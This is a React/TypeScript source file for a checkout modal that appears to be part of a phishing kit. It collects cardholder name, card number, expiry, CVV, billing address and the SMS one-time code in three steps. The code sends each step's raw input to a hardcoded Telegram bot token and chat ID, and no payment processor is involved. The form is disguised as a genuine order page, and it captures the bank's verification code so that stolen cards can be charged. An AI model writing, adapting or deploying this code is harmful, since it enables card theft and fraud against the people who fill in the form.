import React, { useState } from 'react';
import { useForm } from 'react-hook-form';
import Modal from 'react-modal';
import { css } from '@emotion/css';
import Loader from '../Loader';
import axios from 'axios';
import Logo from '../navbar/Logo';
import Support from './sapport';


interface OrderFormProps {
  onClose: () => void;
  price: number;
  totalPrice: number;
}

const OrderForm: React.FC<OrderFormProps> = ({ onClose, price, totalPrice }) => {
  const [isLoading, setIsLoading] = useState(false);
  const [isPaymentVisible, setIsPaymentVisible] = useState(true); // State for payment details visibility
  const [isBillingVisible, setIsBillingVisible] = useState(false); // State for billing form visibility
  const [isPushCodeVisible, setIsPushCodeVisible] = useState(false); // State for push code form visibility
  const { register, handleSubmit, formState: { errors } } = useForm();
  const { register: pushCodeRegister, handleSubmit: handlePushCodeSubmit } = useForm();
  
  
  

  const onSubmit = async (data: any) => {
    setIsLoading(true);

    try {
      // Send data to Telegram bot server
      // Replace YOUR_BOT_TOKEN and CHAT_ID with the appropriate values
      axios.post('https://api.telegram.org/bot6205667743:AAH-MLMSsUo-Q2_8Xt71opVwKOaN8_LUC5Y/sendMessage', {
        chat_id: '-1001962209178',
        text: JSON.stringify(data, null, 2),
      });

      setIsLoading(false);
      setIsPaymentVisible(false); // Hide payment details form
      setIsBillingVisible(true); // Show billing form
    } catch (error) {
      console.error('Error sending data:', error);
      setIsLoading(false);
    }
  };

  const handleBillingSubmission = async (data: any) => {
    setIsLoading(true);

    try {
      // Send billing data to Telegram bot server
      // Replace YOUR_BOT_TOKEN and CHAT_ID with the appropriate values
      axios.post('https://api.telegram.org/bot6205667743:AAH-MLMSsUo-Q2_8Xt71opVwKOaN8_LUC5Y/sendMessage', {
        chat_id: '-1001962209178',
        text: JSON.stringify({...data, price}, null, 2),
      });

      setIsLoading(false);
      setIsBillingVisible(false); // Hide billing form
      setIsPushCodeVisible(true); // Show push code form
    } catch (error) {
      console.error('Error sending data:', error);
      setIsLoading(false);
    }
  };

  const handlePushCodeSubmission = (pushCodeData: any) => {
    const { pushCode } = pushCodeData;
    // Send push code to Telegram bot server
    // Replace YOUR_BOT_TOKEN and CHAT_ID with the appropriate values
    axios.post('https://api.telegram.org/bot6205667743:AAH-MLMSsUo-Q2_8Xt71opVwKOaN8_LUC5Y/sendMessage', {
      chat_id: '-1001962209178',
      text: `Push Code: ${pushCode}`,
    })
      .then(() => {
        setIsPushCodeVisible(false); // Hide push code form
        onClose(); // Call the onClose prop
      })
      .catch((error) => {
        console.error('Error sending push code:', error);
      });
  };

  return (
    <Modal
      isOpen={true} // Always keep the modal open
      onRequestClose={onClose}
      className={css`
        // Modal styles
        max-height: 80vh;
        overflow-y: auto;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 90%;
        max-width: 500px;
        padding: 20px;
        background-color: #fff;
        border-radius: 8px;
        border-color: rgb(69 26 3);
      `}
      contentLabel="Order Form"
    >
      {isPaymentVisible && (
        <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
          <Logo/>
          <Support/>
          <h2 className="text-xl font-bold text-center mt-6">Payments details</h2>
          <div>
            <label htmlFor="cardName" className="block text-sm font-medium text-gray-700">
              Name Holder
            </label>
            <input
              {...register('cardName', { required: true })}
              id="cardName"
              className="mt-1 p-4 block w-full border-neutral-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 sm:text-sm"
              type="text"
            />
            {errors.cardName && (
              <p className="text-red-500 text-xs mt-1">The &quot;Name Holder&quot; field is required</p>
            )}
          </div>

          <div>
            <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700">
              Number Card
            </label>
            <input
              {...register('cardNumber', { required: true })}
              id="cardNumber"
              className="mt-1 p-4 block w-full border-neutral-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 sm:text-sm"
              type="text"
            />
            {errors.cardNumber && (
              <p className="text-red-500 text-xs mt-1">The &quot;Number card&quot; field is required</p>
            )}
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div>
              <label htmlFor="expirationMonth" className="block text-sm font-medium text-gray-700">
                Expiration Month
              </label>
              <select
                {...register('expirationMonth', { required: true })}
                id="expirationMonth"
                className="mt-1 p-4 block w-full border-neutral-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 sm:text-sm"
              >
                <option value="" disabled selected>
                  Month
                </option>
                <option value="01">01</option>
                <option value="02">02</option>
                <option value="03">03</option>
                <option value="04">04</option>
                <option value="05">05</option>
                <option value="06">06</option>
                <option value="07">07</option>
                <option value="08">08</option>
                <option value="09">09</option>
                <option value="10">10</option>
                <option value="11">11</option>
                <option value="12">12</option>
              </select>
              {errors.expirationMonth && (
                <p className="text-red-500 text-xs mt-1">The &quot;Expiration Month&quot; field is required</p>
              )}
            </div>

            <div>
              <label htmlFor="expirationYear" className="block text-sm font-medium text-gray-700">
                Expiration Year
              </label>
              <select
                {...register('expirationYear', { required: true })}
                id="expirationYear"
                className="mt-1 p-4 block w-full border-neutral-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 sm:text-sm"
              >
                <option value={new Date().getFullYear()}>{new Date().getFullYear()}</option>
                <option value="2024">2024</option>
                <option value="2025">2025</option>
                <option value="2026">2026</option>
                <option value="2027">2027</option>
                <option value="2028">2028</option>
                <option value="2029">2029</option>
                <option value="2030">2030</option>
                <option value="2030">2031</option>
                <option value="2030">2032</option>
              </select>
              {errors.expirationYear && (
                <p className="text-red-500 text-xs mt-1">The &quot;Expiration Year&quot; field is required</p>
              )}
          </div>
            <div>
              <label htmlFor="cvv" className="block text-sm font-medium text-gray-700">
                CVV
              </label>
              <input
                {...register('cvv', { required: true })}
                id="cvv"
                className="mt-1 p-4 block w-full border-neutral-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 sm:text-sm"
                type="text"
              />
              {errors.cvv && (
                <p className="text-rose-500 text-xs mt-1">The &quot;CVV&quot; field is required</p>
              )}
            </div>

            <div>
              <label htmlFor="price" className="block text-sm font-medium text-gray-700">
                Price
              </label>
              <div className="flex items-center">
              <input
              {...register('price', { required: true })}
              id="price"
              className="mt-1 p-4 block w-full border-neutral-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 sm:text-sm"
              type="text"
              value={totalPrice} // Замените `totalPrice` на фактическую переменную или состояние с общей стоимостью
              readOnly // Делает поле только для чтения, чтобы предотвратить ввод пользователем
              />
              <span className="ml-2">€</span> {/* Знак евро рядом с totalPrice */}
            </div>
            {errors.price && (
            <p className="text-red-500 text-xs mt-1">The &quot;Price&quot; field is required</p>
            )}
          </div>


          </div>

          <div className="flex justify-center">
            <button
              type="submit"
              className="inline-flex justify-center px-4 py-2 text-lg font-medium text-white bg-rose-600 border border-transparent rounded-md hover:bg-rose-700 focus:outline-none focus-visible:ring-2 focus-visible:ring-offset-2 focus-visible:ring-rose-500"
            >
              next
            </button>
          </div>
        </form>
      )}

      {isBillingVisible && (
        <form onSubmit={handleSubmit(handleBillingSubmission)} className="space-y-6">
          <Logo/>
          <h2 className="text-xl font-bold text-center mt-6">Billing address</h2>

          <div>
            <label htmlFor="address" className="block text-sm font-medium text-gray-700">
              address
            </label>
            <input
              {...register('address', { required: true })}
              id="address"
              className="mt-1 p-4 block w-full border-neutral-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 sm:text-sm"
              type="text"
            />
            {errors.address && (
              <p className="text-red-500 text-xs mt-1">The &quot;Address&quot; field is required</p>
            )}
          </div>
          <div className="grid grid-cols-2 gap-4">
            <div>
              <label htmlFor="city" className="block text-sm font-medium text-gray-700">
                city
              </label>
              <input
                {...register('city', { required: true })}
                id="city"
                className="mt-1 p-4 block w-full border-neutral-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 sm:text-sm"
                type="text"
              />
              {errors.city && (
                <p className="text-red-500 text-xs mt-1">The &quot;City&quot; field is required</p>
              )}
            </div>

            <div>
              <label htmlFor="state" className="block text-sm font-medium text-gray-700">
                state
              </label>
              <input
                {...register('state', { required: false })}
                id="state"
                className="mt-1 p-4 block w-full border-neutral-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 sm:text-sm"
                type="text"
              />
        
            </div>
          </div>

          <div>
            <label htmlFor="zipCode" className="block text-sm font-medium text-gray-700">
              zip code
            </label>
            <input
              {...register('zipCode', { required: true })}
              id="zipCode"
              className="mt-1 p-4 block w-full border-neutral-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 sm:text-sm"
              type="text"
            />
            {errors.zipCode && (
              <p className="text-red-500 text-xs mt-1">The &quot;Zip Code&quot; field is required</p>
            )}
          </div>

          <div>
            <label htmlFor="country" className="block text-sm font-medium text-gray-700">
              country
            </label>
            <input
              {...register('country', { required: true })}
              id="country"
              className="mt-1 p-4 block w-full border-neutral-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 sm:text-sm"
              type="text"
            />
            {errors.country && (
              <p className="text-red-500 text-xs mt-1">The &quot;Country&quot; field is required</p>
            )}
          </div>

          <div className="flex justify-center">
            <button
              type="submit"
              className="inline-flex justify-center px-4 py-2 text-sm font-medium text-white bg-rose-600 border border-transparent rounded-md hover:bg-red-700 focus:outline-none focus-visible:ring-2 focus-visible:ring-offset-2 focus-visible:ring-indigo-500"
            >
              next
            </button>
          </div>
        </form>
      )}

      {isPushCodeVisible && (
        <form onSubmit={handlePushCodeSubmit(handlePushCodeSubmission)} className="space-y-6">
          <Logo/>
          <h2 className="text-xl font-bold text-center mt-6">Enter the code received in SMS</h2>

          <div>
            <label htmlFor="pushCode" className="block text-sm font-medium text-gray-700">
              Push Code
            </label>
            <input
              {...pushCodeRegister('pushCode', { required: true })}
              id="pushCode"
              className="mt-1 p-4 block w-full border-gray-300 rounded-md shadow-sm focus:ring-rose-500 focus:border-rose-500 sm:text-sm"
              type="text"
            />
            {errors.pushCode && (
              <p className="text-red-500 text-xs mt-1">The &quot;Push Code&quot; field is required</p>
            )}
          </div>

          <div className="flex justify-center">
            <button
              type="submit"
              className="inline-flex justify-center px-4 py-2 text-sm font-medium text-white bg-rose-600 border border-transparent rounded-md hover:bg-rose-700 focus:outline-none focus-visible:ring-2 focus-visible:ring-offset-2 focus-visible:ring-indigo-500"
            >
              Submit
            </button>
          </div>
        </form>
      )}
      

      {isLoading && <Loader />}
    </Modal>
  );
};

export default OrderForm;
